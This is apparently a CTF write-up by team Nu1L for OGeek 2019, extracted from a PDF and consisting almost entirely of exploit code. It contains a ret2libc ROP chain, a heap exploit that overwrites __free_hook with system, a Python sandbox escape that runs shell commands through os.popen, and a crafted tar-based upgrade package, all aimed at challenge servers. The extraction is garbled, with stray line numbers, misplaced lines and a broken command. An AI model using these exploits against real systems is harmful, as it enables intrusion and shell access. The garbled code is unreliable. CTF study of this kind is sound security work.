OGeekWrite Up - Nu1L
OGeekWrite Up - Nu1L
catch fun 
babyrop
book manager
Pybox
2019
Upgrade
LookAround 
render 
Easy Realworld Challenge
mblockchain
Hub
8v
Babycry
catch fun
ﬂag{Reno}
babyrop
ROP
#!python
#-*- coding: utf-8 -*-
#@Date: 2019-08-24 11:39:14
from pwn import *
context.log_level = 'debug'
# p = process("./babyrop")
p =remote("47.112.137.238",13337)
elf = ELF("./babyrop")
libc = ELF("./libc-2.23.so")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
p.send("\x00"*7+"\xff"+24*"\x00")
p.send("A"*0xeb+p32(0x8048548)+p32(0x080485A0)+p32(elf.got['puts']))
p.recvuntil("Correct\n")
libc.address = u32(p.recvuntil("\n",drop=True))-libc.sym['puts']
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
book manager
system = libc.sym['system']
log.info("system:"+hex(system))
binsh = next(libc.search('/bin/sh'))
log.info("binsh:"+hex(binsh))
p.send("\x00"*7+"\xff"+24*"\x00")
p.send("A"*0xeb+p32(system)+p32(0x8048825)+p32(binsh))
p.interactive()
19
20
21
22
23
24
25
26
27
#!python
#-*- coding: utf-8 -*-
#@Date: 2019-08-24 19:06:12
from pwn import *
ru = lambda x : p.recvuntil(x,drop=True)
s = lambda x,y : p.sendafter(x,y)
sl = lambda x,y: p.sendlineafter(x,y)
p = remote("47.112.115.30",13337)
libc = ELF('./libc-2.23.so')
s('create: ',"A"*0x1f)
def add_chapter(name):
    sl('Your choice:',str(1))
    s("Chapter name:",name)
def add_section(into,name,leak=False):
    addr = 0
    sl('Your choice:',str(2))
    s('into:',into)
    if leak:
        ru("0x")
        addr = int(ru('\n').ljust(0x8,'\x00'),16)
    s('Section name:',name)
    return addr
def add_text(into,num,text):
    sl('Your choice:',str(3))
    s('into:',into)
    sl('write:',str(num))
    s("Text:",text)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
def dele_chapter(name):
    sl('Your choice:',str(4))
    s('name:',name)
def dele_section(name):
    sl('Your choice:',str(5))
    s('name:',name)
def dele_text(name):
    sl('Your choice:',str(6))
    s('name:',name)
def preview():
    sl('Your choice:',str(7))
def update(choice,name,cnt,r=False):
    sl('Your choice:',str(8))
    s("(Chapter/Section/Text):",choice)
    if r:
        s('Section name:',name)
        s("New Text:",cnt)
    else: 
        s("Section name:",name)
        s('name:',cnt)
add_chapter("c0\n")
add_chapter("c1\n")
heap = add_section("c1",'s0',leak=True)-0x1c0
log.info("heap:"+hex(heap))
dele_chapter('c0')
add_text("s0",1,'\n')
preview()
ru("Section:s0\n")
ru("Text:")
libc.address = u64(ru('\n').ljust(0x8,'\x00'))-0x3c4bf8
log.info("libc.address:"+hex(libc.address))
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']
dele_chapter('c1')
add_chapter('c0')
add_section('c0','s1')
add_text("s1",1,'\n')
update('Text\n','s1\n',"A"*0x18+p64(0x91)+"c2"+'\x00'*(0x20-
2)+p64(heap+0xe8)+"/bin/sh\x00"+4*p64(__free_hook),r=True)
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
Pybox
closureimport oscutﬂag1/0
update('Text\n',"/bin/sh\n",p64(system)+'\n',r = True)
dele_section("/bin/sh\n")
p.interactive()
83
84
85
86
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import string
LOCAL = 0
VERBOSE = 0
DEBUG = 0
context.arch = 'amd64'
get_length = '''1/(len(__import__.__getattribute__('__clo'+'sure__')
[0].cell_contents('o'+'s').__getattribute__('popen')('{}').read())-{})'''
get_content = '''1/(ord(__import__.__getattribute__('__clo'+'sure__')
[0].cell_contents('o'+'s').__getattribute__('popen')('{}').read()[{}])-
{})'''
if VERBOSE:
    context.log_level = 'debug'
if LOCAL:
    io = process('./bin', env={'LD_LIBRARY_PATH': './'})
    # libc = ELF('./libc-2.23.so')
else:
    io = remote('47.112.108.17', 12312)
    # libc = ELF('./libc-2.23.so')
if DEBUG:
    gdb.attach(io, 'b *0x0000000000400F89\n')
io.recvuntil('>>>')
command = 'echo $(>>')
    if 'try again' in res:
        print 'length find:', length
        break
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
2019
lsb+base64+base85
Upgrade
Parser
for idx in range(length):
    for guess in map(ord,string.printable):
        io.sendline(get_content.format(command,idx,guess))
        res = io.recvuntil('>>>')
        if 'try again' in res:
            print 'content[{}] = {}'.format(idx, chr(guess))
            break
37
38
39
40
41
42
43
44
import struct
from hashlib import sha256
f = open('exp.upg','rb')
magic = f.read(4)
assert magic == '\xAA\xCC\xCC\xAA'
record_number = struct.unpack('Q',f.read(8))[0]
sig1 = None
sig2 = None
1
2
3
4
5
6
7
8
9
10
11
12
13
for record_idx in range(record_number):
    f.seek(64*(record_idx)+12)
    content = f.read(64)
    key = content[:2]
    res = content[:2]
    for idx, value in enumerate(content[2:]):
        res += chr(ord(value)^ord(key[idx%2]))
    assert res[56:58] == '\xbe\xbe'
    assert res[54:56] == res[0:2]
    print `res`
    type_ = struct.unpack('I',res[4:8])[0]
    print 'type:',type_
    if type_ == 1:
        off = struct.unpack('Q',res[8:16])[0]
        print off
        length = struct.unpack('Q',res[16:24])[0]
        f.seek(off)
        content = f.read(length)
        sha256_std = res[24:24+0x20]
        sha256_res = sha256(content).hexdigest()
        assert sha256_res == sha256_std.encode('hex')
        with open('res.tar.gz','wb') as out:
            out.write(content)
    elif type_ == 2:
        length = struct.unpack('Q',res[16:24])[0]
        print length
        assert length == 512
        off = struct.unpack('Q',res[8:16])[0]
        print off
        f.seek(off)
        sig1 = f.read(0x200)
    elif type_ == 3:
        length = struct.unpack('Q',res[16:24])[0]
        assert length == 512
        off = struct.unpack('Q',res[8:16])[0]
        print off
        f.seek(off)
        sig2 = f.read(0x200)
f.close()
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
libarchivepaxunicode
archive_read_next_headerARCHIVE_WARNwhilehash1
s0hash
import struct
from hashlib import sha256
import tarfile
with tarfile.open("invalid.tar.gz", "w:gz", format=tarfile.PAX_FORMAT) as 
tar:
    tar.add('123', arcname=u'\ud800xyz')
    tar.add('do_upgrade.sh')
with open('invalid.tar.gz', 'rb') as f:
    payload = f.read()
f = open('expppp.upg', 'wb')
1
2
3
4
5
6
7
8
9
10
11
12
f.write('\xAA\xCC\xCC\xAA')
f.write(struct.pack('Q', 3))
content = '\x00\x00\x00\x00'
off = 204
content += (struct.pack('I', 1))
content += (struct.pack('Q', off))
content += (struct.pack('Q', len(payload)))
content += (sha256(payload).hexdigest().decode('hex'))
content += '\xbe\xbe'
content = content.ljust(64, '0')
res = content[54:56]
for idx, value in enumerate(content[2:]):
    res += chr(ord(value) ^ ord(res[idx % 2]))
f.write(res)
f.seek(off)
f.write(payload)
f.seek(12+64)
content = '\x00\x00\x00\x00'
content += (struct.pack('I', 2))
off = 204 + len(payload)
content += (struct.pack('Q', off))
content += (struct.pack('Q', 512))
content = content.ljust(54, '0')
content += '\x00\x00\xbe\xbe'
content = content.ljust(64, '0')
f.write(content)
f.seek(off)
f.write('\0'*512)
f.seek(12+64*2)
content = '\x00\x00\x00\x00'
content += (struct.pack('I', 3))
off = 204 + len(payload) + 512
content += (struct.pack('Q', off))
content += (struct.pack('Q', 512))
content = content.ljust(54, '0')
content += '\x00\x00\xbe\xbe'
content = content.ljust(64, '0')
f.write(content)
f.seek(off)
13
14
15
16
17
18
19
20
21
22
23
24
25
26